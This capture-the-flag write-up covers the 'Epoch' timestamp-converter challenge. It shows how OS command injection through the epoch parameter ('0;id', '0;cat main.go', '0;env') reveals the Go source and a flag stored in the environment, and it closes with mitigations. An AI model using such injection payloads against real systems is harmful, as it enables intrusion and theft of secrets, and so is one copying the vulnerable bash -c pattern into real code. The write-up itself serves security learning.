# Epoch

## 1. Objective

The objective of the **Epoch** challenge is to analyze an online Unix timestamp conversion application, identify how user input is processed by the backend, exploit any input-validation weaknesses, and retrieve the challenge flag.

**Target:**
`http://10.49.181.151`

---

## 2. Initial Reconnaissance

The website provides an **Epoch to UTC converter** with a text field named `epoch`.

Submitting the value:

```text
0
```

generated the request:

```text
GET /?epoch=0
```

The application returned:

```text
Thu Jan  1 00:00:00 UTC 1970
```

### Initial Observation

The challenge description stated that the website passes user input to a Linux command-line program.

This suggested that the backend may be executing the Linux `date` command using the supplied input.

---

## 3. Testing for Command Injection

A semicolon was appended to the legitimate input:

```text
0;id
```

The server returned:

```text
Thu Jan  1 00:00:00 UTC 1970
uid=1000(challenge) gid=1000(challenge) groups
```

### Result

The `id` command executed successfully.

This confirmed an **OS Command Injection** vulnerability.

The application was executing attacker-controlled input as part of a shell command.

---

## 4. Establishing the Execution Context

The following payload was used:

```text
0;pwd
```

Result:

```text
/home/challenge
```

This identified the application's working directory.

The directory was then enumerated:

```text
0;ls -la
```

Important files included:

```text
main
main.go
go.mod
go.sum
views/
```

This indicated that the application was a Go web application.

---

## 5. Source Code Analysis

The application's source code was retrieved using:

```text
0;cat main.go
```

The critical code was:

```go
cmdString := fmt.Sprintf("date -d @%s", r.Epoch)

cmd := exec.Command("bash", "-c", cmdString)
```

### Vulnerability Analysis

The `epoch` parameter is inserted directly into:

```text
date -d @<USER_INPUT>
```

The resulting string is then passed to:

```text
bash -c
```

No input sanitization or validation is performed.

Therefore, shell metacharacters such as `;` can terminate the intended command and execute arbitrary commands.

For example:

```text
0;id
```

is interpreted by Bash as two commands:

```bash
date -d @0
id
```

---

## 6. Flag Discovery

A search for a conventional flag file was attempted:

```text
0;find / -name flag.txt 2>/dev/null
```

No `flag.txt` file was found.

The next step was to inspect environment variables:

```text
0;env
```

The output contained:

```text
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
```

Therefore, the challenge flag was successfully retrieved.

---

## 7. Final Flag

```text
flag{7da6c7debd40bd611560c13d8149b647}
```

---

## 8. Attack Chain

The complete attack path was:

```text
Web Application
      ↓
epoch GET parameter
      ↓
No input validation
      ↓
User input inserted into Bash command
      ↓
bash -c
      ↓
Command Injection
      ↓
Command execution as challenge user
      ↓
Environment enumeration
      ↓
FLAG environment variable
      ↓
Flag obtained
```

---

## 9. Key Commands Used

### Confirm command execution

```bash
0;id
```

### Identify working directory

```bash
0;pwd
```

### Enumerate application files

```bash
0;ls -la
```

### Read application source

```bash
0;cat main.go
```

### Search for a flag file

```bash
0;find / -name flag.txt 2>/dev/null
```

### Enumerate environment variables

```bash
0;env
```

---

## 10. Vulnerability

**Vulnerability:** OS Command Injection

**Root Cause:** User-controlled input was directly concatenated into a shell command and executed using `bash -c`.

Vulnerable implementation:

```go
cmdString := fmt.Sprintf("date -d @%s", r.Epoch)
cmd := exec.Command("bash", "-c", cmdString)
```

### Recommended Mitigation

The application should avoid invoking a shell for this operation.

Instead of:

```go
exec.Command("bash", "-c", cmdString)
```

the application should pass arguments directly to the executable:

```go
exec.Command("date", "-d", "@"+r.Epoch)
```

Additionally, the application should validate that the `epoch` parameter contains only an expected numeric Unix timestamp.

For example:

```text
^[0-9]+$
```

This prevents shell metacharacters such as:

```text
;
&
|
`
$
```

from being interpreted as commands.

---

## 11. Lessons Learned

* Always inspect how web applications process user-controlled parameters.
* GET parameters can be just as dangerous as POST parameters.
* A statement claiming that an application “passes input to a command-line program” is an important clue during CTF reconnaissance.
* `bash -c` combined with unsanitized user input is a strong indicator of command injection.
* Source-code disclosure or retrieval can make exploitation significantly easier.
* Environment variables are worth checking during post-exploitation because sensitive information, including flags and credentials, may be stored there.
* When a `flag.txt` search fails, do not assume the flag does not exist; investigate environment variables, application source, configuration files, and binaries.

## 12. Conclusion

The Epoch challenge was solved by identifying that the `epoch` parameter was directly incorporated into a Bash command.

The payload:

```text
0;id
```

confirmed arbitrary command execution.

After examining the application source code, the vulnerability was confirmed to be caused by:

```go
exec.Command("bash", "-c", cmdString)
```

Finally, environment enumeration with:

```text
0;env
```

revealed the `FLAG` environment variable containing the challenge flag.